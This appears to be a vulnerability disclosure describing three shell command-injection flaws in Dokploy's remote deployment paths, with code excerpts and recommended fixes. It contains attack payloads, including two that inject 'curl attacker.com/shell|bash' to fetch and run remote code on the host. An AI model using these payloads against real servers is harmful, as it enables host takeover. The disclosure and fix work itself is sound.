## Summary

Three separate injection points in Dokploy's application deployment pipeline use shell single-quote context or unquoted interpolation when writing to remote servers. Each has a safe local code path but a vulnerable remote path (`execAsyncRemote` via SSH).

---

## VULN-009 - Container Escape via schedule.command Single-Quote Breakout → HOST RCE

**File**: `packages/server/src/utils/schedules/utils.ts`  
**Lines**: 76-87 (remote path in `runSchedule`)  
**CWE**: CWE-78 | **CVSS**: 8.0 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

`schedule.command` (DB-stored `text()`, no character restriction) is embedded in a shell string using single-quotes:

```typescript
// REMOTE path (vulnerable) - single-quote breakout
await execAsyncRemote(
    serverId,
    `docker exec ${containerId} ${shellType} -c '${command}'`,  // ← single-quote breakout
);

// LOCAL path (safe) - argv array, no shell
await spawnAsync("docker", ["exec", containerId, shellType, "-c", command], ...);
```

This is a **container escape**: the single-quote breakout happens at the HOST shell level before `docker exec` runs. A `'` in `command` causes arbitrary code to run on the HOST, not inside the target container.

Attack payload: `command = "'; touch /tmp/host-escape; echo '"` → `docker exec ABC bash -c ''; touch /tmp/host-escape; echo ''` → `touch /tmp/host-escape` runs on **HOST**.

---

## VULN-010 - Command Injection via Traefik YAML Config Single-Quote Breakout → HOST RCE

**File**: `packages/server/src/utils/traefik/application.ts`  
**Line**: 275 (`writeTraefikConfigRemote`)  
**CWE**: CWE-78 | **CVSS**: 8.0 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

`writeTraefikConfigRemote` serializes a YAML Traefik config and writes it using `echo '${yamlStr}'`. User-controlled domain fields (path prefixes, middleware parameters) flow into `yamlStr`. A `'` in any such field breaks out of the single-quote context:

```typescript
export const writeTraefikConfigRemote = async (traefikConfig: FileConfig, appName: string, serverId: string) => {
    const yamlStr = stringify(traefikConfig);
    await execAsyncRemote(serverId, `echo '${yamlStr}' > ${configPath}`);  // ← UNQUOTED
};
```

The safe sibling `writeConfigRemote` (line 213) correctly uses base64 encoding:
```typescript
const encoded = encodeBase64(traefikConfig);
await execAsyncRemote(serverId, `echo "${encoded}" | base64 -d > "${configPath}"`);  // SAFE
```

Attack: set `internalPath = "/api'$(curl attacker.com/shell|bash)#"` in domain settings → single-quote breakout → HOST RCE.

---

## VULN-014 - Command Injection via composePath in docker compose Deployment → HOST RCE

**File**: `packages/server/src/services/compose.ts`  
**Line**: 475 (`startCompose`)  
**CWE**: CWE-78 | **CVSS**: 8.0 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

`compose.composePath` (`z.string().min(1)`, no regex) is interpolated unquoted into the `-f` flag of docker compose:

```typescript
const path = compose.sourceType === "raw" ? "docker-compose.yml" : compose.composePath;
const baseCommand = `env -i PATH="$PATH" docker compose -p ${compose.appName} -f ${path} up -d`;
await execAsyncRemote(compose.serverId, `cd ${projectPath} && ${baseCommand}`);
```

Condition: `sourceType` must be `"git"`, `"github"`, or `"gitlab"` (not `"raw"`).

Attack: `composePath = "docker-compose.yml; curl attacker.com/shell | bash #"` → HOST RCE on deploy.

---

## Recommended Fixes

```typescript
// VULN-009: use quote() on command field
await execAsyncRemote(serverId, `docker exec ${containerId} ${shellType} -c ${quote([command])}`);

// VULN-010: use base64 pattern (already implemented in writeConfigRemote)
const encoded = encodeBase64(stringify(traefikConfig));
await execAsyncRemote(serverId, `echo "${encoded}" | base64 -d > "${configPath}"`);

// VULN-014: quote composePath
const safePath = compose.sourceType === "raw" ? "docker-compose.yml" : quote([compose.composePath]);
const baseCommand = `env -i PATH="$PATH" docker compose -p ${quote([compose.appName])} -f ${safePath} up -d`;
```

## Verification

Confirmed via static analysis on Dokploy v0.29.8. Note the systematic asymmetry in VULN-009: the local code path uses `spawnAsync` with an argv array (safe) but the remote path reconstructs a shell string (vulnerable).
